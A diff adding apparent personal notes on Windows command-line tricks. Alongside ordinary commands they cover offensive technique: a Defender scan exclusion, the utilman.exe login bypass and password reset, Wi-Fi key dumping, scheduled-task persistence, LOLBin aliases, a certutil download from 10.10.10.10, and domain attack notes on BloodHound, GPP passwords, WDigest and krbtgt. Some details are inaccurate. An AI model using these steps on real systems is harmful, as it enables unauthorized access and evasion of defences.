@@ -1,0 +1,141 @@
+Powershell:
+Environment Variables:
+-$env:COMSPEC: contains the path of cmd
+
+CMD:
+-%COMSPEC%: contains the path of cmd
+-set: you can use it to display all environment variables
+NOTE: if you changed the value of the COMSPEC environment variable any other command that depends on that variable will also be affected
+for example let's change it to calc.exe then try for example the following command:
+echo "hello, world" | clip
+what you will notice is that calc.exe has been executed.
+-start <process-name>: starts a process
+example:
+  start iexplore -> starts windows explorer
+  another living off land binary execuation if you try to execute the following: 
+  start iexplore shell:::{3f6bc534-dfa1-4ab4-ae54-ef25a74e0107}
+  it will popup system restore if you have control over the environment variable "SYSTEMROOT" you can go ahead and execute what ever binary you want.
+NOTE: we can use shell:::<name-of-app> or shell:::<cls-id> to fire up an app or open up a location and here is the complete list of them:
+https://winaero.com/windows--11-shell-commands-the-complete-list/
+
+fsutil fsinfo ntfsinfo <partition-label>: to know some info such as sector size of the current partition
+
+Execlude a path from scanning:
+Set-MpPreference -ExclusionPath <path>
+
+Format disk using disk part:
+list disk
+select disk <disk-number>
+list partition
+create primary partition
+clean: to clean disk or patition
+format fs=<file-system-name>
+
+list volume
+select volume <vol-number>
+convert <mbr,gbt,...>: to convert to another format of a partition table
+
+active: will the current selected partition as the active (or primary partition)
+
+Command Line Regestery:
+reg <operation> "reg key": to deal with registery
+
+Schedule Tasks using cmd:
+schtasks /create /tn "T1053_005_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe"
+
+Windows Internals:
+
+What is a process:
+a process is a virtualized container that is totally isolated from the os and any other app, it has:
+-memory
+-security
+-threads
+-ipc: which is the rules that tells the process how to communicate with other processes and with the os
+
+NOTE: everything nowadays runs in a process including apps and services except the operating system.
+
+NOTE: if you have windows native build tools you can use the dumpbin tool to see all of the imports of an executable
+
+NOTE: in windows in general you can mark a file as locked so that no one else can access or do anything to that file until it's unlocked
+
+-subst path-to-mount new-drive-letter: to mount a folder or a drive to a custom endpoint
+
+
+Bybass Windows Login:
+1.usb that has a valid windows installation
+2.boot from usb
+3.open command prompt and execute "wmic logicaldisk get name"
+4.head over to the windows drive within the sys32 dir locate utilman.exe
+- the key here is to execute another exe other than the original one
+5.rename the filename and copy cmd for example to this directory with the name of the original tool
+6.go back to windows login screen and press acessablitly button
+7.cmd will launch then you can now change the password of that user by using the following command "net user <username> <new-password>"
+
+Common and Important Commands:
+copy /b imagename+filename newfilename: is used to hide a file within an image
+cipher /E: will encrypt all the files within the current folder and no one else but me can open them.
+attrib +h +s +r nameofthefile: to hide a file and to show do - instead of +
+netsh wlan show profile "network name" key=clear: shows all the info (include passwords) of wifi networks that you have connected to.
+color {foreground,background} colors
+prompt {text}: to change the prompt text
+title "text": to change the title of the cmd
+curl wttr.in "city name": to get the weather
+curl --head --location "url" | findstr "Location": to unshorten your shorten links
+curl qrenco.de/<websiteurl>: to create a url to your website
+curl -s https://decapi.me/youtube/latest_video?user=<nameofytchannel>
+
+
+Bypass cmd is disabled by your admin:
+1.create a batch script that opens cmd in an infinite loop and run it
+2.using ftp command and execute any command preceded by !
+
+PSExec:
+is a cmd line utility that allows you to run processes on your machine or on another machine on the network
+
+OPEN CMD as NT System User:
+psexec -i -s cmd.exe (NOTE: with an admin account)
+
+Change Folders and Files Permissions from CMD:
+CACLS <Path> /e /p {Username}:{Permission} (W, R, F)
+
+LOLBin to hide commands:
+reg.exe add "HKLM\System\CurrentControlSet\Control\Terminal Server\Utilities\query" /v LOLBin /t REG_MULTI_SZ /d 0\01\0LOLBin\0calc.exe -> where LOLBin is an alias for the exe calc.exe that can run with the query command
+
+Restart and boot into bios directly:
+-shutdown /r /fw (boot to bios) /t 1
+
+Useful Tools for enumerating over a windows network that is a domain:
+- powerview -> powershell script to run on the comprimsed computer 
+- bloodhound -> powershell script to run on the comprimsed computer and a tool on the attacker machine and you simply grab the data to the attacker machine so that you can visualize it and know what is your next movement
+
+Difference Between ntlm and ntlmv2 protocols:
+-the normal ntlm protocol is 128bit which means 16 bytes written as 32 characters, ntlmv2 on the other hand is also 16 bytes length but is written as 48 hexadecimal string characters.
+
+Tokens:
+are temparary keys that allows you to access a machine without providing credientials.
+there are 2 types of tokens:
+1-delegate tokens: are created when a user logs in
+2.impersonate tokens: log on as a specific user
+
+LDAP Protocol:
+is used to manage and access active directory objects such as users and groups etc...
+
+Group Policy Preferences Attack (GPP Attack):
+in brief without diging deeper into the details of the attack, if the admin saved the group policy preferences windows will save the password of the admin along with these preferences into a xml file in a folder called SYSVOL. the target systems is windows server 2012
+
+
+Wdigest feature in windows:
+is a windows feature that is disabled by default in recent windows versions and it stores passwords of users that logs into this computer in plain text in memory
+
+NOTE: if we take control of an account with the name krbtgt on a server or a domain controller then we have the full control of generate all sort of tickets (i.e TGT, TGS tickets).
+
+CertUtil.exe: is a tool that allows you to download a file from a remote server
+example: certutil.exe -urlcache -f http://10.10.10.10/file.txt file.txt
+
+CreateJobObjectA: 
+is win32 api function that allows you to create a job which is a kernel object that allows you to group a set of processes to run under a set of security attributes and constraints.
+
+SetPriorityClass:
+is a win32 api function that allows you to programmatically change the priority of a process and as the priority goes up the more cpu time the operating system will give you.
+
+NOTE: windows uses round robin algorithm to do the context switching between processes
